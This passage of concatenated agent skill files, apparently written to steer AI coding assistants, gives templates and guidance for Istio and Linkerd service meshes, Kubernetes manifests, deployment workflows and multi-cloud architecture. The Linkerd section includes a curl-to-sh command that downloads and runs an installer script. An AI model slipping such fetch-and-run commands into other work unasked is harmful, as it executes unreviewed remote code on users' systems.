3. **Consolidate traffic** through fewer connections
4. **Minimize data transfer** costs
5. **Use Direct Connect** for high bandwidth
6. **Implement caching** to reduce traffic

## Reference Files

- `references/vpn-setup.md` - VPN configuration guide
- `references/direct-connect.md` - Direct Connect setup

## Related Skills

- `multi-cloud-architecture` - For architecture decisions
- `terraform-module-library` - For IaC implementation

## Source: references/skills/cloud-architect/references/legacy/istio-traffic-management/SKILL.md

---
name: istio-traffic-management
description: "Configure Istio traffic management including routing, load balancing, circuit breakers, and canary deployments. Use when implementing service mesh traffic policies, progressive delivery, or resilie..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Istio Traffic Management

Comprehensive guide to Istio traffic management for production service mesh deployments.

## Do not use this skill when

- The task is unrelated to istio traffic management
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Use this skill when

- Configuring service-to-service routing
- Implementing canary or blue-green deployments
- Setting up circuit breakers and retries
- Load balancing configuration
- Traffic mirroring for testing
- Fault injection for chaos engineering

## Core Concepts

### 1. Traffic Management Resources

| Resource | Purpose | Scope |
|----------|---------|-------|
| **VirtualService** | Route traffic to destinations | Host-based |
| **DestinationRule** | Define policies after routing | Service-based |
| **Gateway** | Configure ingress/egress | Cluster edge |
| **ServiceEntry** | Add external services | Mesh-wide |

### 2. Traffic Flow

```
Client → Gateway → VirtualService → DestinationRule → Service
                   (routing)        (policies)        (pods)
```

## Templates

### Template 1: Basic Routing

```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: reviews-route
  namespace: bookinfo
spec:
  hosts:
    - reviews
  http:
    - match:
        - headers:
            end-user:
              exact: jason
      route:
        - destination:
            host: reviews
            subset: v2
    - route:
        - destination:
            host: reviews
            subset: v1
---
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: reviews-destination
  namespace: bookinfo
spec:
  host: reviews
  subsets:
    - name: v1
      labels:
        version: v1
    - name: v2
      labels:
        version: v2
    - name: v3
      labels:
        version: v3
```

### Template 2: Canary Deployment

```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: my-service-canary
spec:
  hosts:
    - my-service
  http:
    - route:
        - destination:
            host: my-service
            subset: stable
          weight: 90
        - destination:
            host: my-service
            subset: canary
          weight: 10
---
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: my-service-dr
spec:
  host: my-service
  trafficPolicy:
    connectionPool:
      tcp:
        maxConnections: 100
      http:
        h2UpgradePolicy: UPGRADE
        http1MaxPendingRequests: 100
        http2MaxRequests: 1000
  subsets:
    - name: stable
      labels:
        version: stable
    - name: canary
      labels:
        version: canary
```

### Template 3: Circuit Breaker

```yaml
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: circuit-breaker
spec:
  host: my-service
  trafficPolicy:
    connectionPool:
      tcp:
        maxConnections: 100
      http:
        http1MaxPendingRequests: 100
        http2MaxRequests: 1000
        maxRequestsPerConnection: 10
        maxRetries: 3
    outlierDetection:
      consecutive5xxErrors: 5
      interval: 30s
      baseEjectionTime: 30s
      maxEjectionPercent: 50
      minHealthPercent: 30
```

### Template 4: Retry and Timeout

```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: ratings-retry
spec:
  hosts:
    - ratings
  http:
    - route:
        - destination:
            host: ratings
      timeout: 10s
      retries:
        attempts: 3
        perTryTimeout: 3s
        retryOn: connect-failure,refused-stream,unavailable,cancelled,retriable-4xx,503
        retryRemoteLocalities: true
```

### Template 5: Traffic Mirroring

```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: mirror-traffic
spec:
  hosts:
    - my-service
  http:
    - route:
        - destination:
            host: my-service
            subset: v1
      mirror:
        host: my-service
        subset: v2
      mirrorPercentage:
        value: 100.0
```

### Template 6: Fault Injection

```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: fault-injection
spec:
  hosts:
    - ratings
  http:
    - fault:
        delay:
          percentage:
            value: 10
          fixedDelay: 5s
        abort:
          percentage:
            value: 5
          httpStatus: 503
      route:
        - destination:
            host: ratings
```

### Template 7: Ingress Gateway

```yaml
apiVersion: networking.istio.io/v1beta1
kind: Gateway
metadata:
  name: my-gateway
spec:
  selector:
    istio: ingressgateway
  servers:
    - port:
        number: 443
        name: https
        protocol: HTTPS
      tls:
        mode: SIMPLE
        credentialName: my-tls-secret
      hosts:
        - "*.example.com"
---
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: my-vs
spec:
  hosts:
    - "api.example.com"
  gateways:
    - my-gateway
  http:
    - match:
        - uri:
            prefix: /api/v1
      route:
        - destination:
            host: api-service
            port:
              number: 8080
```

## Load Balancing Strategies

```yaml
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: load-balancing
spec:
  host: my-service
  trafficPolicy:
    loadBalancer:
      simple: ROUND_ROBIN  # or LEAST_CONN, RANDOM, PASSTHROUGH
---
# Consistent hashing for sticky sessions
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: sticky-sessions
spec:
  host: my-service
  trafficPolicy:
    loadBalancer:
      consistentHash:
        httpHeaderName: x-user-id
        # or: httpCookie, useSourceIp, httpQueryParameterName
```

## Best Practices

### Do's
- **Start simple** - Add complexity incrementally
- **Use subsets** - Version your services clearly
- **Set timeouts** - Always configure reasonable timeouts
- **Enable retries** - But with backoff and limits
- **Monitor** - Use Kiali and Jaeger for visibility

### Don'ts
- **Don't over-retry** - Can cause cascading failures
- **Don't ignore outlier detection** - Enable circuit breakers
- **Don't mirror to production** - Mirror to test environments
- **Don't skip canary** - Test with small traffic percentage first

## Debugging Commands

```bash
# Check VirtualService configuration
istioctl analyze

# View effective routes
istioctl proxy-config routes deploy/my-app -o json

# Check endpoint discovery
istioctl proxy-config endpoints deploy/my-app

# Debug traffic
istioctl proxy-config log deploy/my-app --level debug
```

## Resources

- [Istio Traffic Management](https://istio.io/latest/docs/concepts/traffic-management/)
- [Virtual Service Reference](https://istio.io/latest/docs/reference/config/networking/virtual-service/)
- [Destination Rule Reference](https://istio.io/latest/docs/reference/config/networking/destination-rule/)

## Source: references/skills/cloud-architect/references/legacy/k8s-manifest-generator/SKILL.md

---
name: k8s-manifest-generator
description: "Create production-ready Kubernetes manifests for Deployments, Services, ConfigMaps, and Secrets following best practices and security standards. Use when generating Kubernetes YAML manifests, creat..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Kubernetes Manifest Generator

Step-by-step guidance for creating production-ready Kubernetes manifests including Deployments, Services, ConfigMaps, Secrets, and PersistentVolumeClaims.

## Use this skill when

Use this skill when you need to:
- Create new Kubernetes Deployment manifests
- Define Service resources for network connectivity
- Generate ConfigMap and Secret resources for configuration management
- Create PersistentVolumeClaim manifests for stateful workloads
- Follow Kubernetes best practices and naming conventions
- Implement resource limits, health checks, and security contexts
- Design manifests for multi-environment deployments

## Do not use this skill when

- The task is unrelated to kubernetes manifest generator
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Resources

- `resources/implementation-playbook.md` for detailed patterns and examples.

## Source: references/skills/cloud-architect/references/legacy/kubernetes-architect/SKILL.md

---
name: kubernetes-architect
description: Expert Kubernetes architect specializing in cloud-native infrastructure, advanced GitOps workflows (ArgoCD/Flux), and enterprise container orchestration.
risk: unknown
source: community
date_added: '2026-02-27'
---
You are a Kubernetes architect specializing in cloud-native infrastructure, modern GitOps workflows, and enterprise container orchestration at scale.

## Use this skill when

- Designing Kubernetes platform architecture or multi-cluster strategy
- Implementing GitOps workflows and progressive delivery
- Planning service mesh, security, or multi-tenancy patterns
- Improving reliability, cost, or developer experience in K8s

## Do not use this skill when

- You only need a local dev cluster or single-node setup
- You are troubleshooting application code without platform changes
- You are not using Kubernetes or container orchestration

## Instructions

1. Gather workload requirements, compliance needs, and scale targets.
2. Define cluster topology, networking, and security boundaries.
3. Choose GitOps tooling and delivery strategy for rollouts.
4. Validate with staging and define rollback and upgrade plans.

## Safety

- Avoid production changes without approvals and rollback plans.
- Test policy changes and admission controls in staging first.

## Purpose
Expert Kubernetes architect with comprehensive knowledge of container orchestration, cloud-native technologies, and modern GitOps practices. Masters Kubernetes across all major providers (EKS, AKS, GKE) and on-premises deployments. Specializes in building scalable, secure, and cost-effective platform engineering solutions that enhance developer productivity.

## Capabilities

### Kubernetes Platform Expertise
- **Managed Kubernetes**: EKS (AWS), AKS (Azure), GKE (Google Cloud), advanced configuration and optimization
- **Enterprise Kubernetes**: Red Hat OpenShift, Rancher, VMware Tanzu, platform-specific features
- **Self-managed clusters**: kubeadm, kops, kubespray, bare-metal installations, air-gapped deployments
- **Cluster lifecycle**: Upgrades, node management, etcd operations, backup/restore strategies
- **Multi-cluster management**: Cluster API, fleet management, cluster federation, cross-cluster networking

### GitOps & Continuous Deployment
- **GitOps tools**: ArgoCD, Flux v2, Jenkins X, Tekton, advanced configuration and best practices
- **OpenGitOps principles**: Declarative, versioned, automatically pulled, continuously reconciled
- **Progressive delivery**: Argo Rollouts, Flagger, canary deployments, blue/green strategies, A/B testing
- **GitOps repository patterns**: App-of-apps, mono-repo vs multi-repo, environment promotion strategies
- **Secret management**: External Secrets Operator, Sealed Secrets, HashiCorp Vault integration

### Modern Infrastructure as Code
- **Kubernetes-native IaC**: Helm 3.x, Kustomize, Jsonnet, cdk8s, Pulumi Kubernetes provider
- **Cluster provisioning**: Terraform/OpenTofu modules, Cluster API, infrastructure automation
- **Configuration management**: Advanced Helm patterns, Kustomize overlays, environment-specific configs
- **Policy as Code**: Open Policy Agent (OPA), Gatekeeper, Kyverno, Falco rules, admission controllers
- **GitOps workflows**: Automated testing, validation pipelines, drift detection and remediation

### Cloud-Native Security
- **Pod Security Standards**: Restricted, baseline, privileged policies, migration strategies
- **Network security**: Network policies, service mesh security, micro-segmentation
- **Runtime security**: Falco, Sysdig, Aqua Security, runtime threat detection
- **Image security**: Container scanning, admission controllers, vulnerability management
- **Supply chain security**: SLSA, Sigstore, image signing, SBOM generation
- **Compliance**: CIS benchmarks, NIST frameworks, regulatory compliance automation

### Service Mesh Architecture
- **Istio**: Advanced traffic management, security policies, observability, multi-cluster mesh
- **Linkerd**: Lightweight service mesh, automatic mTLS, traffic splitting
- **Cilium**: eBPF-based networking, network policies, load balancing
- **Consul Connect**: Service mesh with HashiCorp ecosystem integration
- **Gateway API**: Next-generation ingress, traffic routing, protocol support

### Container & Image Management
- **Container runtimes**: containerd, CRI-O, Docker runtime considerations
- **Registry strategies**: Harbor, ECR, ACR, GCR, multi-region replication
- **Image optimization**: Multi-stage builds, distroless images, security scanning
- **Build strategies**: BuildKit, Cloud Native Buildpacks, Tekton pipelines, Kaniko
- **Artifact management**: OCI artifacts, Helm chart repositories, policy distribution

### Observability & Monitoring
- **Metrics**: Prometheus, VictoriaMetrics, Thanos for long-term storage
- **Logging**: Fluentd, Fluent Bit, Loki, centralized logging strategies
- **Tracing**: Jaeger, Zipkin, OpenTelemetry, distributed tracing patterns
- **Visualization**: Grafana, custom dashboards, alerting strategies
- **APM integration**: DataDog, New Relic, Dynatrace Kubernetes-specific monitoring

### Multi-Tenancy & Platform Engineering
- **Namespace strategies**: Multi-tenancy patterns, resource isolation, network segmentation
- **RBAC design**: Advanced authorization, service accounts, cluster roles, namespace roles
- **Resource management**: Resource quotas, limit ranges, priority classes, QoS classes
- **Developer platforms**: Self-service provisioning, developer portals, abstract infrastructure complexity
- **Operator development**: Custom Resource Definitions (CRDs), controller patterns, Operator SDK

### Scalability & Performance
- **Cluster autoscaling**: Horizontal Pod Autoscaler (HPA), Vertical Pod Autoscaler (VPA), Cluster Autoscaler
- **Custom metrics**: KEDA for event-driven autoscaling, custom metrics APIs
- **Performance tuning**: Node optimization, resource allocation, CPU/memory management
- **Load balancing**: Ingress controllers, service mesh load balancing, external load balancers
- **Storage**: Persistent volumes, storage classes, CSI drivers, data management

### Cost Optimization & FinOps
- **Resource optimization**: Right-sizing workloads, spot instances, reserved capacity
- **Cost monitoring**: KubeCost, OpenCost, native cloud cost allocation
- **Bin packing**: Node utilization optimization, workload density
- **Cluster efficiency**: Resource requests/limits optimization, over-provisioning analysis
- **Multi-cloud cost**: Cross-provider cost analysis, workload placement optimization

### Disaster Recovery & Business Continuity
- **Backup strategies**: Velero, cloud-native backup solutions, cross-region backups
- **Multi-region deployment**: Active-active, active-passive, traffic routing
- **Chaos engineering**: Chaos Monkey, Litmus, fault injection testing
- **Recovery procedures**: RTO/RPO planning, automated failover, disaster recovery testing

## OpenGitOps Principles (CNCF)
1. **Declarative** - Entire system described declaratively with desired state
2. **Versioned and Immutable** - Desired state stored in Git with complete version history
3. **Pulled Automatically** - Software agents automatically pull desired state from Git
4. **Continuously Reconciled** - Agents continuously observe and reconcile actual vs desired state

## Behavioral Traits
- Champions Kubernetes-first approaches while recognizing appropriate use cases
- Implements GitOps from project inception, not as an afterthought
- Prioritizes developer experience and platform usability
- Emphasizes security by default with defense in depth strategies
- Designs for multi-cluster and multi-region resilience
- Advocates for progressive delivery and safe deployment practices
- Focuses on cost optimization and resource efficiency
- Promotes observability and monitoring as foundational capabilities
- Values automation and Infrastructure as Code for all operations
- Considers compliance and governance requirements in architecture decisions

## Knowledge Base
- Kubernetes architecture and component interactions
- CNCF landscape and cloud-native technology ecosystem
- GitOps patterns and best practices
- Container security and supply chain best practices
- Service mesh architectures and trade-offs
- Platform engineering methodologies
- Cloud provider Kubernetes services and integrations
- Observability patterns and tools for containerized environments
- Modern CI/CD practices and pipeline security

## Response Approach
1. **Assess workload requirements** for container orchestration needs
2. **Design Kubernetes architecture** appropriate for scale and complexity
3. **Implement GitOps workflows** with proper repository structure and automation
4. **Configure security policies** with Pod Security Standards and network policies
5. **Set up observability stack** with metrics, logs, and traces
6. **Plan for scalability** with appropriate autoscaling and resource management
7. **Consider multi-tenancy** requirements and namespace isolation
8. **Optimize for cost** with right-sizing and efficient resource utilization
9. **Document platform** with clear operational procedures and developer guides

## Example Interactions
- "Design a multi-cluster Kubernetes platform with GitOps for a financial services company"
- "Implement progressive delivery with Argo Rollouts and service mesh traffic splitting"
- "Create a secure multi-tenant Kubernetes platform with namespace isolation and RBAC"
- "Design disaster recovery for stateful applications across multiple Kubernetes clusters"
- "Optimize Kubernetes costs while maintaining performance and availability SLAs"
- "Implement observability stack with Prometheus, Grafana, and OpenTelemetry for microservices"
- "Create CI/CD pipeline with GitOps for container applications with security scanning"
- "Design Kubernetes operator for custom application lifecycle management"

## Source: references/skills/cloud-architect/references/legacy/kubernetes-deployment/SKILL.md

---
name: kubernetes-deployment
description: "Kubernetes deployment workflow for container orchestration, Helm charts, service mesh, and production-ready K8s configurations."
category: granular-workflow-bundle
risk: safe
source: personal
date_added: "2026-02-27"
---

# Kubernetes Deployment Workflow

## Overview

Specialized workflow for deploying applications to Kubernetes including container orchestration, Helm charts, service mesh configuration, and production-ready K8s patterns.

## When to Use This Workflow

Use this workflow when:
- Deploying to Kubernetes
- Creating Helm charts
- Configuring service mesh
- Setting up K8s networking
- Implementing K8s security

## Workflow Phases

### Phase 1: Container Preparation

#### Skills to Invoke
- `docker-expert` - Docker containerization
- `k8s-manifest-generator` - K8s manifests

#### Actions
1. Create Dockerfile
2. Build container image
3. Optimize image size
4. Push to registry
5. Test container

#### Copy-Paste Prompts
```
Use @docker-expert to containerize application for K8s
```

### Phase 2: K8s Manifests

#### Skills to Invoke
- `k8s-manifest-generator` - Manifest generation
- `kubernetes-architect` - K8s architecture

#### Actions
1. Create Deployment
2. Configure Service
3. Set up ConfigMap
4. Create Secrets
5. Add Ingress

#### Copy-Paste Prompts
```
Use @k8s-manifest-generator to create K8s manifests
```

### Phase 3: Helm Chart

#### Skills to Invoke
- `helm-chart-scaffolding` - Helm charts

#### Actions
1. Create chart structure
2. Define values.yaml
3. Add templates
4. Configure dependencies
5. Test chart

#### Copy-Paste Prompts
```
Use @helm-chart-scaffolding to create Helm chart
```

### Phase 4: Service Mesh

#### Skills to Invoke
- `istio-traffic-management` - Istio
- `linkerd-patterns` - Linkerd
- `service-mesh-expert` - Service mesh

#### Actions
1. Choose service mesh
2. Install mesh
3. Configure traffic management
4. Set up mTLS
5. Add observability

#### Copy-Paste Prompts
```
Use @istio-traffic-management to configure Istio
```

### Phase 5: Security

#### Skills to Invoke
- `k8s-security-policies` - K8s security
- `mtls-configuration` - mTLS

#### Actions
1. Configure RBAC
2. Set up NetworkPolicy
3. Enable PodSecurity
4. Configure secrets
5. Implement mTLS

#### Copy-Paste Prompts
```
Use @k8s-security-policies to secure Kubernetes cluster
```

### Phase 6: Observability

#### Skills to Invoke
- `grafana-dashboards` - Grafana
- `prometheus-configuration` - Prometheus

#### Actions
1. Install monitoring stack
2. Configure Prometheus
3. Create Grafana dashboards
4. Set up alerts
5. Add distributed tracing

#### Copy-Paste Prompts
```
Use @prometheus-configuration to set up K8s monitoring
```

### Phase 7: Deployment

#### Skills to Invoke
- `deployment-engineer` - Deployment
- `gitops-workflow` - GitOps

#### Actions
1. Configure CI/CD
2. Set up GitOps
3. Deploy to cluster
4. Verify deployment
5. Monitor rollout

#### Copy-Paste Prompts
```
Use @gitops-workflow to implement GitOps deployment
```

## Quality Gates

- [ ] Containers working
- [ ] Manifests valid
- [ ] Helm chart installs
- [ ] Security configured
- [ ] Monitoring active
- [ ] Deployment successful

## Related Workflow Bundles

- `cloud-devops` - Cloud/DevOps
- `terraform-infrastructure` - Infrastructure
- `docker-containerization` - Containers

## Source: references/skills/cloud-architect/references/legacy/linkerd-patterns/SKILL.md

---
name: linkerd-patterns
description: "Implement Linkerd service mesh patterns for lightweight, security-focused service mesh deployments. Use when setting up Linkerd, configuring traffic policies, or implementing zero-trust networking ..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Linkerd Patterns

Production patterns for Linkerd service mesh - the lightweight, security-first service mesh for Kubernetes.

## Do not use this skill when

- The task is unrelated to linkerd patterns
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Use this skill when

- Setting up a lightweight service mesh
- Implementing automatic mTLS
- Configuring traffic splits for canary deployments
- Setting up service profiles for per-route metrics
- Implementing retries and timeouts
- Multi-cluster service mesh

## Core Concepts

### 1. Linkerd Architecture

```
┌─────────────────────────────────────────────┐
│                Control Plane                 │
│  ┌─────────┐ ┌──────────┐ ┌──────────────┐ │
│  │ destiny │ │ identity │ │ proxy-inject │ │
│  └─────────┘ └──────────┘ └──────────────┘ │
└─────────────────────────────────────────────┘
                      │
┌─────────────────────────────────────────────┐
│                 Data Plane                   │
│  ┌─────┐    ┌─────┐    ┌─────┐             │
│  │proxy│────│proxy│────│proxy│             │
│  └─────┘    └─────┘    └─────┘             │
│     │           │           │               │
│  ┌──┴──┐    ┌──┴──┐    ┌──┴──┐            │
│  │ app │    │ app │    │ app │            │
│  └─────┘    └─────┘    └─────┘            │
└─────────────────────────────────────────────┘
```

### 2. Key Resources

| Resource | Purpose |
|----------|---------|
| **ServiceProfile** | Per-route metrics, retries, timeouts |
| **TrafficSplit** | Canary deployments, A/B testing |
| **Server** | Define server-side policies |
| **ServerAuthorization** | Access control policies |

## Templates

### Template 1: Mesh Installation

```bash
# Install CLI
curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh

# Validate cluster
linkerd check --pre

# Install CRDs
linkerd install --crds | kubectl apply -f -

# Install control plane
linkerd install | kubectl apply -f -

# Verify installation
linkerd check

# Install viz extension (optional)
linkerd viz install | kubectl apply -f -
```

### Template 2: Inject Namespace

```yaml
# Automatic injection for namespace
apiVersion: v1
kind: Namespace
metadata:
  name: my-app
  annotations:
    linkerd.io/inject: enabled
---
# Or inject specific deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-app
  annotations:
    linkerd.io/inject: enabled
spec:
  template:
    metadata:
      annotations:
        linkerd.io/inject: enabled
```

### Template 3: Service Profile with Retries

```yaml
apiVersion: linkerd.io/v1alpha2
kind: ServiceProfile
metadata:
  name: my-service.my-namespace.svc.cluster.local
  namespace: my-namespace
spec:
  routes:
    - name: GET /api/users
      condition:
        method: GET
        pathRegex: /api/users
      responseClasses:
        - condition:
            status:
              min: 500
              max: 599
          isFailure: true
      isRetryable: true
    - name: POST /api/users
      condition:
        method: POST
        pathRegex: /api/users
      # POST not retryable by default
      isRetryable: false
    - name: GET /api/users/{id}
      condition:
        method: GET
        pathRegex: /api/users/[^/]+
      timeout: 5s
      isRetryable: true
  retryBudget:
    retryRatio: 0.2
    minRetriesPerSecond: 10
    ttl: 10s
```

### Template 4: Traffic Split (Canary)

```yaml
apiVersion: split.smi-spec.io/v1alpha1
kind: TrafficSplit
metadata:
  name: my-service-canary
  namespace: my-namespace
spec:
  service: my-service
  backends:
    - service: my-service-stable
      weight: 900m  # 90%
    - service: my-service-canary
      weight: 100m  # 10%
```

### Template 5: Server Authorization Policy

```yaml
# Define the server
apiVersion: policy.linkerd.io/v1beta1
kind: Server
metadata:
  name: my-service-http
  namespace: my-namespace
spec:
  podSelector:
    matchLabels:
      app: my-service
  port: http
  proxyProtocol: HTTP/1
---
# Allow traffic from specific clients
apiVersion: policy.linkerd.io/v1beta1
kind: ServerAuthorization
metadata:
  name: allow-frontend
  namespace: my-namespace
spec:
  server:
    name: my-service-http
  client:
    meshTLS:
      serviceAccounts:
        - name: frontend
          namespace: my-namespace
---
# Allow unauthenticated traffic (e.g., from ingress)
apiVersion: policy.linkerd.io/v1beta1
kind: ServerAuthorization
metadata:
  name: allow-ingress
  namespace: my-namespace
spec:
  server:
    name: my-service-http
  client:
    unauthenticated: true
    networks:
      - cidr: 10.0.0.0/8
```

### Template 6: HTTPRoute for Advanced Routing

```yaml
apiVersion: policy.linkerd.io/v1beta2
kind: HTTPRoute
metadata:
  name: my-route
  namespace: my-namespace
spec:
  parentRefs:
    - name: my-service
      kind: Service
      group: core
      port: 8080
  rules:
    - matches:
        - path:
            type: PathPrefix
            value: /api/v2
        - headers:
            - name: x-api-version
              value: v2
      backendRefs:
        - name: my-service-v2
          port: 8080
    - matches:
        - path:
            type: PathPrefix
            value: /api
      backendRefs:
        - name: my-service-v1
          port: 8080
```

### Template 7: Multi-cluster Setup

```bash
# On each cluster, install with cluster credentials
linkerd multicluster install | kubectl apply -f -

# Link clusters
linkerd multicluster link --cluster-name west \
  --api-server-address https://west.example.com:6443 \
  | kubectl apply -f -

# Export a service to other clusters
kubectl label svc/my-service mirror.linkerd.io/exported=true

# Verify cross-cluster connectivity
linkerd multicluster check
linkerd multicluster gateways
```

## Monitoring Commands

```bash
# Live traffic view
linkerd viz top deploy/my-app

# Per-route metrics
linkerd viz routes deploy/my-app

# Check proxy status
linkerd viz stat deploy -n my-namespace

# View service dependencies
linkerd viz edges deploy -n my-namespace

# Dashboard
linkerd viz dashboard
```

## Debugging

```bash
# Check injection status
linkerd check --proxy -n my-namespace

# View proxy logs
kubectl logs deploy/my-app -c linkerd-proxy

# Debug identity/TLS
linkerd identity -n my-namespace

# Tap traffic (live)
linkerd viz tap deploy/my-app --to deploy/my-backend
```

## Best Practices

### Do's
- **Enable mTLS everywhere** - It's automatic with Linkerd
- **Use ServiceProfiles** - Get per-route metrics and retries
- **Set retry budgets** - Prevent retry storms
- **Monitor golden metrics** - Success rate, latency, throughput

### Don'ts
- **Don't skip check** - Always run `linkerd check` after changes
- **Don't over-configure** - Linkerd defaults are sensible
- **Don't ignore ServiceProfiles** - They unlock advanced features
- **Don't forget timeouts** - Set appropriate values per route

## Resources

- [Linkerd Documentation](https://linkerd.io/2.14/overview/)
- [Service Profiles](https://linkerd.io/2.14/features/service-profiles/)
- [Authorization Policy](https://linkerd.io/2.14/features/server-policy/)

## Source: references/skills/cloud-architect/references/legacy/multi-cloud-architecture/SKILL.md

---
name: multi-cloud-architecture
description: "Design multi-cloud architectures using a decision framework to select and integrate services across AWS, Azure, and GCP. Use when building multi-cloud systems, avoiding vendor lock-in, or leveragin..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Multi-Cloud Architecture

Decision framework and patterns for architecting applications across AWS, Azure, and GCP.

## Do not use this skill when

- The task is unrelated to multi-cloud architecture
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Purpose

Design cloud-agnostic architectures and make informed decisions about service selection across cloud providers.

## Use this skill when

- Design multi-cloud strategies
- Migrate between cloud providers
- Select cloud services for specific workloads
- Implement cloud-agnostic architectures
- Optimize costs across providers

## Cloud Service Comparison

### Compute Services

| AWS | Azure | GCP | Use Case |
|-----|-------|-----|----------|
| EC2 | Virtual Machines | Compute Engine | IaaS VMs |
| ECS | Container Instances | Cloud Run | Containers |
| EKS | AKS | GKE | Kubernetes |
| Lambda | Functions | Cloud Functions | Serverless |
| Fargate | Container Apps | Cloud Run | Managed containers |

### Storage Services

| AWS | Azure | GCP | Use Case |
|-----|-------|-----|----------|
| S3 | Blob Storage | Cloud Storage | Object storage |
| EBS | Managed Disks | Persistent Disk | Block storage |
| EFS | Azure Files | Filestore | File storage |
| Glacier | Archive Storage | Archive Storage | Cold storage |

### Database Services

| AWS | Azure | GCP | Use Case |
|-----|-------|-----|----------|
| RDS | SQL Database | Cloud SQL | Managed SQL |
| DynamoDB | Cosmos DB | Firestore | NoSQL |
| Aurora | PostgreSQL/MySQL | Cloud Spanner | Distributed SQL |
| ElastiCache | Cache for Redis | Memorystore | Caching |

**Reference:** See `references/service-comparison.md` for complete comparison

## Multi-Cloud Patterns

### Pattern 1: Single Provider with DR

- Primary workload in one cloud
- Disaster recovery in another
- Database replication across clouds
- Automated failover

### Pattern 2: Best-of-Breed

- Use best service from each provider
- AI/ML on GCP
- Enterprise apps on Azure
- General compute on AWS

### Pattern 3: Geographic Distribution

- Serve users from nearest cloud region
- Data sovereignty compliance
- Global load balancing
- Regional failover

### Pattern 4: Cloud-Agnostic Abstraction

- Kubernetes for compute
- PostgreSQL for database
- S3-compatible storage (MinIO)
- Open source tools

## Cloud-Agnostic Architecture

### Use Cloud-Native Alternatives

- **Compute:** Kubernetes (EKS/AKS/GKE)
- **Database:** PostgreSQL/MySQL (RDS/SQL Database/Cloud SQL)
- **Message Queue:** Apache Kafka (MSK/Event Hubs/Confluent)
- **Cache:** Redis (ElastiCache/Azure Cache/Memorystore)
- **Object Storage:** S3-compatible API
- **Monitoring:** Prometheus/Grafana
- **Service Mesh:** Istio/Linkerd

### Abstraction Layers

```
Application Layer
    ↓
Infrastructure Abstraction (Terraform)
    ↓
Cloud Provider APIs
    ↓
AWS / Azure / GCP
```

## Cost Comparison

### Compute Pricing Factors

- **AWS:** On-demand, Reserved, Spot, Savings Plans
- **Azure:** Pay-as-you-go, Reserved, Spot
- **GCP:** On-demand, Committed use, Preemptible

### Cost Optimization Strategies

1. Use reserved/committed capacity (30-70% savings)
2. Leverage spot/preemptible instances
3. Right-size resources
4. Use serverless for variable workloads
5. Optimize data transfer costs
6. Implement lifecycle policies
7. Use cost allocation tags
8. Monitor with cloud cost tools

**Reference:** See `references/multi-cloud-patterns.md`

## Migration Strategy

### Phase 1: Assessment
- Inventory current infrastructure
- Identify dependencies
- Assess cloud compatibility
- Estimate costs

### Phase 2: Pilot
- Select pilot workload
- Implement in target cloud
- Test thoroughly
- Document learnings

### Phase 3: Migration
- Migrate workloads incrementally
- Maintain dual-run period
- Monitor performance
- Validate functionality

### Phase 4: Optimization
- Right-size resources
- Implement cloud-native services
- Optimize costs
- Enhance security

## Best Practices

1. **Use infrastructure as code** (Terraform/OpenTofu)
2. **Implement CI/CD pipelines** for deployments
3. **Design for failure** across clouds
4. **Use managed services** when possible
5. **Implement comprehensive monitoring**
6. **Automate cost optimization**
7. **Follow security best practices**
8. **Document cloud-specific configurations**
9. **Test disaster recovery** procedures
10. **Train teams** on multiple clouds

## Reference Files

- `references/service-comparison.md` - Complete service comparison
- `references/multi-cloud-patterns.md` - Architecture patterns

## Related Skills

- `terraform-module-library` - For IaC implementation
- `cost-optimization` - For cost management
- `hybrid-cloud-networking` - For connectivity

## Source: references/skills/cloud-architect/references/legacy/service-mesh-expert/SKILL.md

---
name: service-mesh-expert
description: "Expert service mesh architect specializing in Istio, Linkerd, and cloud-native networking patterns. Masters traffic management, security policies, observability integration, and multi-cluster mesh con"
risk: unknown
source: community
date_added: "2026-02-27"
---

# Service Mesh Expert

Expert service mesh architect specializing in Istio, Linkerd, and cloud-native networking patterns. Masters traffic management, security policies, observability integration, and multi-cluster mesh configurations. Use PROACTIVELY for service mesh architecture, zero-trust networking, or microservices communication patterns.

## Do not use this skill when

- The task is unrelated to service mesh expert
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Capabilities

- Istio and Linkerd installation, configuration, and optimization
- Traffic management: routing, load balancing, circuit breaking, retries
- mTLS configuration and certificate management
- Service mesh observability with distributed tracing
- Multi-cluster and multi-cloud mesh federation
- Progressive delivery with canary and blue-green deployments
- Security policies and authorization rules

## Use this skill when

- Implementing service-to-service communication in Kubernetes
- Setting up zero-trust networking with mTLS
- Configuring traffic splitting for canary deployments
- Debugging service mesh connectivity issues
